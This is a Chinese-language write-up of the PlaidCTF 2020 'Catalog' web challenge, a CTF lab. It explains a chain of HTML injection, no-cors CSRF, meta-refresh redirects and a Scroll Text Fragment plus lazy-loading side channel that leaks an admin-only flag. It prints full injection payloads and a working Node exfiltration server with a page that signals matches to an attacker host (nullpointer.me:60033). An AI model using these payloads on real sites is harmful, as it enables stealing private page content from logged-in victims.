Title = "PlaidCTF2020  Catalog"
description = "PlaidCTF2020上0解的题目，需要比较多的浏览器相关的背景知识"
tags = ["CTF","WriteUp"]
publishtime = 2020-05-10T10:55:54
lastedittime = 2020-05-10T10:55:54
uuid = "59eff919-16b0-4d3c-8797-d5f92c9046dc"
-+_+-



> [Here’s the site](http://catalog.pwni.ng/). The flag is on [this page](http://catalog.pwni.ng/issue.php?id=3).
>
> Browser: Chromium **with uBlock Origin 1.26.0 installed and in its default configuration**
>
> Flag format: `/^PCTF\{[A-Z0-9_]+\}$/`
>
> **Hints**:
>
> - To view your post, the admin will click on a link on the admin page.
> - You might want to read up on User Activation.
> - The intended solution does not require you to submit hundreds of captchas.
>
> Hint: Admin Bot Timeout
>
> The admin bot will always disconnect after about 30 seconds.



这道题目是PlaidCTF的唯一一道0解的题目，主要是Chrome的一些特性，所涉及到的知识比较尖

做这道题需要知道的背景知识有

- User Activation v2
- Scroll Text Fragments
- Image and Iframe via Lazy Loading

这几个特性我都单独整理成一篇文章了，大家可以先去看看那篇文章





## 概况

这道题目的网站是个很典型的 XSS 类型的网站，具有以下功能：

- 登录注册
- 发表 issue
- 给 admin bot 提交 issue 查看



简单测试一下各个输入的地方，主要有以下问题



1. 在登录注册的地方，登录错误时我们的 username 没有过滤原样输出，存在一处 HTML 注入

```
mote<svg onload="alert()"></svg>
```

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/20200511105935.png)



2. 在提交 issue 处的 image-url 可以闭合上下文存在 HTML 注入（存储型）



<img src="https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/20200511110731.png" style="zoom:50%;" />

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/20200511110800.png)



3. 如果你抓包就会发现，无论登录成功与否，都会返回302，这就提示了我们题目中会利用 session 来存储提示登录失败的元素，如果使用同一个 session 先登录 ，然后再发送一次失败的登录请求，然后刷新页面，此时，该 session 的页面会变为登录失败的页面



4. 结合第一点和第三点，我们可以达到往 flag 页面进行 HTML 注入的效果（利用fetch  no-cors 请求来跨域实现 CSRF ）

```javascript
fetch("http://catalog.pwni.ng/user.php", {
	method: "POST",
	mode: "no-cors",
	credentials: "include",
	headers: {
		"content-type": "application/x-www-form-urlencoded"
	},
	body: `username=${encodeURIComponent("<marquee>Nice!</marquee>")}&password=fail&action=login`
}).then(() => {
	window.location = "http://catalog.pwni.ng/issue.php?id=3";
});

```



## CSP

```
Content-Security-Policy: 
default-src 'nonce-eKcQ8H1T+86IcYC/KNn4+Q7VbbxCOgiQ'; img-src *; font-src 'self' fonts.gstatic.com; frame-src https://www.google.com/recaptcha/
```

存在如下CSP导致无法直接XSS，这里没有限制 `base-uri`，可以使用 `<base>`标签，但是这道题的两处 HTML 注入都无法控制页面的 head 部分 ，所以该思路无法实际利用。

但是这里允许使用 `<meta>`来控制跳转

```
<meta http-equiv="refresh" content="0;URL='http://url/'" />
```





## Lettering

题目使用了lettering，lettering是用来对一个 element 中的每个字符用 `<span>`包裹，具体运用请查看相关api文档

http://letteringjs.com/

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" nonce="G16J8mnwUQaXUADZ/t/ztpQvxvv/UvmM"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/lettering.js/0.7.0/jquery.lettering.min.js" nonce="G16J8mnwUQaXUADZ/t/ztpQvxvv/UvmM"></script>

<script src="/js/main.js" nonce="G16J8mnwUQaXUADZ/t/ztpQvxvv/UvmM"></script>
```

寻找使用到 Lettering 的地方，在 `/js/main.js`处使用到了

```
$("em").lettering();
```

所以我们在对应的地方加入 `<em>` 标签，在该标签之后的所有内容都会对内容进行拆分

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/20200511113028.png)

还记得Scroll Text Fragment 的一些特点吗？完整匹配，在同一个块内，Lettering 的引入使得我们可以逐个字符来泄露 flag ，我们只需要利用 flag 处的 HTML 实体注入来注入一个 `<em>`标签



## uBlock

题目还使用了 uBlock ，这里估计把很大一票选手带偏了，看了很久 uBlock 的源码找 gadget之类，2333

根据作者的提示

> Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.

uBlock 的引入是为了调用 Scroll Text Fragments 相关特性时能够满足 User Activation v2 的限制

管理员点击我们提交的链接时，uBlock会发送一个 postMessage 到扩展 iframe 来实现复制 user activation 状态的目的

https://github.com/gorhill/uBlock/blob/1.26.0/src/js/contentscript.js

在content script里有个调用叫 `vAPI.messaging.send`，它是postMessage 的抽象

https://github.com/gorhill/uBlock/blob/1.26.0/platform/chromium/vapi-client.js#L204

关于 uBlock 如何达到复制 user activation的，请查看（活学活用，这太方便了，尤其在没有锚点的地方又想引用的时候）

[https://dttw.tech/posts/B19RXWzYL#:~:text=Let%E2%80%99s%20consider](https://dttw.tech/posts/B19RXWzYL#:~:text=Let's consider)

其中过程如下图所示

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/20200511200858.png)



## 做题思路



**已知的条件**

- CSP限制，可以使用 `<meta>`来控制跳转
- 两处 HTML 注入，登录失败处为反射型，issue提交处为存储型
- Admin Bot 会点击我们提交的 issue 
- Flag 在同源的一个页面，只有 admin 可以访问：http://catalog.pwni.ng/issue.php?id=3
- 引入了 lettering.js 以及 uBlock



**Twitter上@lbherrera_的思路**

1. 利用session会存储一定的 HTML 元素的条件，即使在登录状态下，利用 fetch no-cors 来更新界面，利用登录失败的注入，使得在同一 session 的界面得到一处 HTML 注入，这里就可以对 flag 所在页面进行 HTML 注入了
2. 利用 HTML 注入的条件，往页面中注入足够多的 `<br>`标签，使得 Flag 超出视窗阈值（ viewport threshold）的范围，并在`<br>`标签的最后加入一张懒加载图片，利用 Lazy Loading 来判断 Scroll Text Fragments 是否匹配到 Flag
3. 在自己的 VPS 上监听，在懒加载图片里填写远程请求的payload，如果匹配成功会滚动到对应位置，Flag 在懒加载图片的下面，所以一定会触发 Lazy Loading ，如果匹配失败则仍然在页面最上方，不会触发  Lazy Loading 



**利用二分的思想来 leak data**

题目中提示了 Flag 的正则为`/^PCTF\{[A-Z0-9_]+\}$/`

每次调用 Scroll Text Fragments 来匹配单个字符太慢了，根据其语法，我们可以实现一次完全匹配，并利用二分法的思想来减少发送次数，这也许就是出题人为什么说不用发送大量请求的原因了。

```
http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}&text=T-,F,{,-0&text=T-,F,{,-1&text=T-,F,{,-2&text=T-,F,{,-3&text=T-,F,{,-4&text=T-,F,{,-5&text=T-,F,{,-6&text=T-,F,{,-7&text=T-,F,{,-8&text=T-,F,{,-9&text=T-,F,{,-A&text=T-,F,{,-B&text=T-,F,{,-D&text=T-,F,{,-E&text=T-,F,{,-F&text=T-,F,{,-G&text=T-,F,{,-H&text=T-,F,{,-I&text=T-,F,{,-J&text=T-,F,{,-K&text=T-,F,{,-L&text=T-,F,{,-M&text=T-,F,{,-N&text=T-,F,{,-O&text=T-,F,{,-P&text=T-,F,{,-Q&text=T-,F,{,-R&text=T-,F,{,-S&text=T-,F,{,-T&text=T-,F,{,-U&text=T-,F,{,-V&text=T-,F,{,-W&text=T-,F,{,-X&text=T-,F,{,-Y&text=T-,F,{,-Z&text=T-,F,{,-_
下一次匹配
http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}&text=T-,F,{,-0&text=T-,F,{,-1&text=T-,F,{,-2&text=T-,F,{,-3&text=T-,F,{,-4&text=T-,F,{,-5&text=T-,F,{,-6&text=T-,F,{,-7&text=T-,F,{,-8&text=T-,F,{,-9&text=T-,F,{,-A&text=T-,F,{,-B&text=T-,F,{,-D&text=T-,F,{,-E&text=T-,F,{,-F&text=T-,F,{,-G&text=T-,F,{,-H&text=T-,F,{,-I
如果不在上面的一半，就匹配另一个范围
```

然后继续二分



## 做题步骤

1. 创建两个issue 

issue 1  ，假设 id 为 4，  该 issue 将使用`<meta>`引导 admin 跳到我们的 vps 上

```
id=4&title=xxxxxx&content=xxxxxx&image="><meta http-equiv="refresh" content="0;URL='http://vps/'"><img src="
```

issue 2 ，假设 id 为 5，该issue 会跳转到完成了 HTML注入的 flag 页面，利用 Scroll Text Fragment 以及 Lazy Loading 来完成侧信道

```
id=5&title=xxxxxx&content=xxxxxx&image=z"/><img src="http://vps:60033/fragment"><meta http-equiv="refresh"+content="0;URL='http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}&text=T-,F,{,-0&text=T-,F,{,-1&text=T-,F,{,-2&text=T-,F,{,-3&text=T-,F,{,-4&text=T-,F,{,-5&text=T-,F,{,-6&text=T-,F,{,-7&text=T-,F,{,-8&text=T-,F,{,-9&text=T-,F,{,-A&text=T-,F,{,-B&text=T-,F,{,-D&text=T-,F,{,-E&text=T-,F,{,-F&text=T-,F,{,-G&text=T-,F,{,-H&text=T-,F,{,-I&text=T-,F,{,-J&text=T-,F,{,-K&text=T-,F,{,-L&text=T-,F,{,-M&text=T-,F,{,-N&text=T-,F,{,-O&text=T-,F,{,-P&text=T-,F,{,-Q&text=T-,F,{,-R&text=T-,F,{,-S&text=T-,F,{,-T&text=T-,F,{,-U&text=T-,F,{,-V&text=T-,F,{,-W&text=T-,F,{,-X&text=T-,F,{,-Y&text=T-,F,{,-Z&text=T-,F,{,-_'">
```



2. 在VPS上部署 @lbherrera_ 的 exp.js 以及 index.html 并运行 nodejs exp.js 需要安装 express 框架

exp.js

```
const express = require("express");
const app = express();

let status = false;
let unlock = false;
let match = false;

app.get("/status", (req, res) => {
    res.send(`${status}`);
});

app.get("/unlock", (req, res) => {
    unlock = true;
    res.send("unlock");
});

app.get("/firstload", (req, res) => {
    console.log("==> Admin opened challenge's page");
    res.send("firstload");
});

app.get("/", (req, res) => {
    console.log("==> Admin was redirected to attacker's page");
    res.sendFile("index.html", {
        root: __dirname
    });
});

app.get("/injection", (req, res) => {
    console.log("==> HTML injection was inserted into id=3 catalog");
    setTimeout(() => {
        if (match) console.log("==> There was a match");
        else console.log("==> There wasn't a match");
        match = false;
        unlock = false;
        status = false;
    }, 1000);
    res.send("injection");
});

app.get("/exfiltrated", (req, res) => {
    match = true;
    res.send("exfiltrated");
});

app.get("/fragment", (req, res) => {
    status = true;
    console.log("==> Admin was fragmented");
    let timer = setInterval(async () => {
        if (unlock) {
            res.send("fragment");
            clearInterval(timer);
        }
    }, 1);
});

app.listen(60033);
console.log("Server running on port: " + 60033);
```

index.html

```
<html>
    <head>
        <title>Psst! Get out of here...</title>
        <script>
            const next = async () => {
                let res  = await fetch("/status");
                let status = await res.text();
                if (status === "true") {
                    await fetch("http://catalog.pwni.ng/user.php", {
                        "headers": {
                            "content-type": "application/x-www-form-urlencoded",
                        },
                        "body": `username="/><img src="http://nullpointer.me:60033/injection"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><div align="left"><img src="http://nullpointer.me:60033/exfiltrated" loading="lazy"></div><em>&password=1&action=login`,
                        "method": "POST",
                        "mode": "no-cors",
                        "credentials": "include"
                    });
                    await fetch("/unlock");
                } else {
                    next();
                }
            }
            next();
        </script>
    </head>
    <body>
        <iframe src="http://catalog.pwni.ng/issue.php?id=5" style="position: absolute; width: 400%; height: 500px; border: 0"></iframe>
    </body>
</html>
```

关于 exp.js 和 index.html 的具体功能可以看下面的博客

https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/#Detailed-Attack-Chain

主要功能就是fetch no-cors 来进行 flag 处的 HTML 注入，实现锁的功能来确保执行顺序，获取是否匹配信息的结果



3. 生成 Google capture code ，将 issue1 提交给 admin ，根据题目的提示，admin 会进行点击操作

```
grecaptcha.ready(async () => {
    let token = await grecaptcha.execute("6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y", {
        action: "report"
    });
    console.log(token);
});

//id=19977&token=<CODE>
```



4. 根据 exp.js 的输出来判断Scroll Text Fragments 是否匹配到 flag 并触发 lazy loading





**作者的完整演示视频**

https://www.youtube.com/watch?v=9-7H3RTSmw0